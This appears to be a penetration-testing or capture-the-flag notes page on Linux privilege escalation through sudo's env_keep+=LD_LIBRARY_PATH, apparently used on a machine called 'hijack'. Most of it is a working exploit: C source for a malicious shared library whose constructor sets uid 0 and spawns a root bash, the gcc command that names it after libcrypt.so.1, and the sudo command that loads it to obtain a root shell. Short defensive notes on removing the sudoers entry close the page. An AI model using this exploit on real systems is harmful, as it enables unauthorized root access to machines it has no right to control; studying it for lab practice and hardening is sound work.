# LD_LIBRARY_PATH Privilege Escalation (sudo env_keep)

Used on: **hijack**

When `sudo` is configured with `env_keep+=LD_LIBRARY_PATH`, the dynamic linker search path is inherited by the privileged process. By placing a malicious shared library (named identically to one the binary links against) in a directory we control, and pointing `LD_LIBRARY_PATH` there, Linux loads our library instead of the real one. The constructor runs as root.

## Prerequisites

- Shell as a low-privilege user.
- `sudo -l` shows **both**:
  - `env_keep+=LD_LIBRARY_PATH`
  - At least one command the user can run as root.

```
(root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
env_keep+=LD_LIBRARY_PATH
```

## Steps

### 1. Identify a shared library the binary loads

<!-- cmd: linux -->
```bash
ldd /usr/sbin/apache2
# libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
```

### 2. Create a malicious replacement library

<!-- cmd: linux -->
```bash
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Compile using the exact filename of the real library
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/evil.c
```

### 3. Execute the allowed command with LD_LIBRARY_PATH pointing to /tmp

<!-- cmd: linux -->
```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
# → root shell spawned before apache2 initialises
```

## Verification

<!-- cmd: linux -->
```bash
whoami
# root
```

## Notes

- Pick any library from `ldd` output — the one that loads first wins.
- `__attribute__((constructor))` is the GCC equivalent of `_init()`; both work.
- Differs from LD_PRELOAD: here we hijack the library search *path*, not a single preloaded library.

## Defensive Notes

- Remove `env_keep+=LD_LIBRARY_PATH` from `/etc/sudoers`.
- Audit all `env_keep` entries — any that influence the dynamic linker can lead to privesc.
